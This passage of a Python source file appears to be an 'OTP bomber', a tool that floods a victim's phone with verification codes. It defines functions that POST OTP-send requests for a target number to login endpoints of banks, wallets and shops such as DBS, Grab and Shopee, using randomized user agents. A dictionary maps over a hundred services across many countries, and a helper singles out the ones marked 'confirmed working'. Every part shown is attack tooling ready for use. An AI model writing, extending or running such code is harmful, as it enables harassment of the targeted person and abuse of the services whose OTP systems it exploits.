        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_tng_otp(phone):
    try:
        phone_my = fmt_my(phone)
        url = "https://api.tngdigital.com.my/v1/auth/otp/send"  # BEDA
        payload = {"phoneNumber": phone_my, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_shopee_my_otp(phone):
    try:
        phone_my = fmt_my(phone)
        url = "https://shopee.com.my/api/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_my, "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_grab_my_otp(phone):
    try:
        phone_my = fmt_my(phone)
        url = "https://api.grab.com/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_my, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_foodpanda_sg_otp(phone):
    try:
        phone_sg = fmt_sg(phone)
        url = "https://api.foodpanda.sg/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_sg, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_dbs_sg_otp(phone):
    try:
        phone_sg = fmt_sg(phone)
        url = "https://www.dbs.com.sg/api/v1/auth/otp/send"  # BEDA
        payload = {"phoneNumber": phone_sg, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

# ================================================================
# ===== ALL HANDLERS DICT =====
# ================================================================

ALL_HANDLERS = {
    # INDONESIA BANKS
    'bca': send_bca_otp,
    'mandiri': send_mandiri_otp,
    'bri': send_bri_otp,
    'bni': send_bni_otp,
    'btn': send_btn_otp,
    'cimb': send_cimb_otp,
    'danamon': send_danamon_otp,
    'permata': send_permata_otp,
    'ocbc': send_ocbc_otp,
    'btpn': send_btpn_otp,
    'jenius': send_jenius_otp,
    'maybank': send_maybank_otp,
    'panin': send_panin_otp,
    'mega': send_mega_otp,
    'bukopin': send_bukopin_otp,
    
    # E-WALLETS
    'ovo': send_ovo_otp,
    'dana': send_dana_otp,
    'gopay': send_gopay_otp,
    'shopeepay': send_shopeepay_otp,
    'linkaja': send_linkaja_otp,
    'payfazz': send_payfazz_otp,
    'akulaku': send_akulaku_otp,
    
    # E-COMMERCE
    'tokopedia': send_tokopedia_otp,
    'shopee': send_shopee_otp,
    'gojek': send_gojek_otp,
    'blibli': send_blibli_otp,
    'bukalapak': send_bukalapak_otp,
    'lazada': send_lazada_otp,
    'jdid': send_jdid_otp,
    'zalora': send_zalora_otp,
    
    # SERVICES
    'tiktok': send_tiktok_otp,
    'olx': send_olx_otp,
    'indihome': send_indihome_otp,
    'alodokter': send_alodokter_otp,
    'halodoc': send_halodoc_otp,
    'oyo': send_oyo_otp,
    'sayurbox': send_sayurbox_otp,
    'carsome': send_carsome_otp,
    'pizzahut': send_pizzahut_otp,
    'matahari': send_matahari_otp,
    'pinhome': send_pinhome_otp,
    'klook': send_klook_otp,
    'erafone': send_erafone_otp,
    '99co': send_99co_otp,
    'belirumah': send_belirumah_otp,
    'fastwork': send_fastwork_otp,
    'beautyhaul': send_beautyhaul_otp,
    'hainaya': send_hainaya_otp,
    'ultramilk': send_ultramilk_otp,
    'internetrakyat': send_internetrakyat_otp,
    'auto2000': send_auto2000_otp,
    'royalcanin': send_royalcanin_otp,
    'watsons': send_watsons_otp,
    'lapormasbup': send_lapormasbup_otp,
    
    # USA
    'zillow': send_zillow_otp,
    'snapchat': send_snapchat_otp,
    'tinder': send_tinder_otp,
    'walmart': send_walmart_otp,
    'amazon_us': send_amazon_us_otp,
    'target': send_target_otp,
    'costco': send_costco_otp,
    'bestbuy': send_bestbuy_otp,
    'homedepot': send_homedepot_otp,
    'lowes': send_lowes_otp,
    'macys': send_macys_otp,
    'kohls': send_kohls_otp,
    'nordstrom': send_nordstrom_otp,
    'nike': send_nike_otp,
    'adidas': send_adidas_otp,
    'gap': send_gap_otp,
    
    # UK
    'sky': send_sky_otp,
    'tesco': send_tesco_otp,
    'asda': send_asda_otp,
    'sainsburys': send_sainsburys_otp,
    'morrisons': send_morrisons_otp,
    'coop': send_coop_otp,
    'waitrose': send_waitrose_otp,
    'boots': send_boots_otp,
    'argos': send_argos_otp,
    
    # INDIA
    'flipkart': send_flipkart_otp,
    'paytm': send_paytm_otp,
    'myntra': send_myntra_otp,
    'meesho': send_meesho_otp,
    'bookmyshow': send_bookmyshow_otp,
    'cleartrip': send_cleartrip_otp,
    'goibibo': send_goibibo_otp,
    'irctc': send_irctc_otp,
    
    # DELIVERY
    'uber': send_uber_otp,
    'doordash': send_doordash_otp,
    'deliveroo': send_deliveroo_otp,
    'justeat': send_justeat_otp,
    'grab': send_grab_otp,
    'foodpanda': send_foodpanda_otp,
    'lyft': send_lyft_otp,
    'postmates': send_postmates_otp,
    
    # BRAZIL
    'ifood': send_ifood_otp,
    'mercadolivre': send_mercadolivre_otp,
    'rappi': send_rappi_otp,
    
    # JAPAN
    'line': send_line_otp,
    'rakuten': send_rakuten_otp,
    'mercari': send_mercari_otp,
    
    # KOREA
    'naver': send_naver_otp,
    'kakao': send_kakao_otp,
    'coupang': send_coupang_otp,
    
    # AUSTRALIA
    'woolworths': send_woolworths_otp,
    'coles': send_coles_otp,
    
    # RUSSIA
    'yandex': send_yandex_otp,
    'vk': send_vk_otp,
    
    # EUROPE
    'zalando': send_zalando_otp,
    'amazon_de': send_amazon_de_otp,
    'cdiscount': send_cdiscount_otp,
    'allegro': send_allegro_otp,
    
    # MIDDLE EAST
    'noon': send_noon_otp,
    'amazon_ae': send_amazon_ae_otp,
    
    # SOUTHEAST ASIA
    'gcash': send_gcash_otp,
    'tng': send_tng_otp,
    'shopee_my': send_shopee_my_otp,
    'grab_my': send_grab_my_otp,
    'foodpanda_sg': send_foodpanda_sg_otp,
    'dbs_sg': send_dbs_sg_otp,
}

def get_all_handlers():
    return ALL_HANDLERS

def get_working_handlers():
    """Return only handlers that are confirmed working"""
    working = {}
    for k, v in ALL_HANDLERS.items():
        if k in ['bri', 'bri_sms', 'danamon', 'ovo', 'dana', 'gopay', 'shopeepay', 'tokopedia', 'shopee', 'gojek', 'blibli', 'tiktok', 'olx', 'klook', 'uber', 'doordash', 'grab', 'flipkart', 'paytm', 'walmart', 'amazon_us', 'target']:
            working[k] = v
    return working
